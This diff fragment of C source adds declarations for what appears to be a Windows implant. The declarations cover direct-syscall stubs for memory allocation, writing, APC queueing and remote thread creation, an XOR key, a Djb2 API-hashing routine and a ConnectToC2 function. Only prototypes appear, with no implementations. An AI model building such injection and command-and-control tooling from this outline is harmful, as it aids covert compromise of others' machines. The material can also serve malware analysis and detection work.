@@ -35,7 +35,20 @@ typedef NTSTATUS (NTAPI *_NtQueryInformationProcess)(
     PULONG ReturnLength
 );
 
+extern UCHAR _NtAllocateVirtualMemory[];
+extern UCHAR _NtWriteVirtualMemory[];
+extern UCHAR _NtProtectVirtualMemory[];
+extern UCHAR _NtResumeThread[];
+extern UCHAR _NtWaitForSingleObject[];
+extern UCHAR _NtQueueApcThread[];
+extern UCHAR __NtQueryInformationProcess[];
+extern UCHAR _NtReadVirtualMemory[];
+extern UCHAR _NtCreateThreadEx[];
+extern UCHAR _NtOpenProcess[];
+extern UCHAR key[];
+
 void XOR(PUCHAR data, size_t data_sz, PUCHAR key, size_t key_sz);
+VOID SetupConstants();
 void hexdump(char *data, size_t size);
 DWORD Djb2W(BYTE* data);
 BOOL ConnectToC2(SOCKET* c2Socket);
